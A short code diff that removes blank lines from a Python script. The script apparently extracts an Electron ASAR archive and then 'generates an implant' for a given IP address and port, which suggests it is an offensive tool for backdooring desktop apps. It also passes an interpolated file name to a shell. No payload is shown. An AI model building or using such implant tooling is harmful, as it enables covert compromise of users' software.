@@ -306,11 +306,9 @@ def extractAsar(archive):
     print(f"Extracting ASAR archive: {archive}...")
     subprocess.run(f'npx asar e {archive} extract', shell=True)
 
-
 def createAsarFile(asarArchive, ipaddress, port):
 
     extractAsar(asarArchive)
-
     tempDir = "extract"
 
     print("Generating implant...")
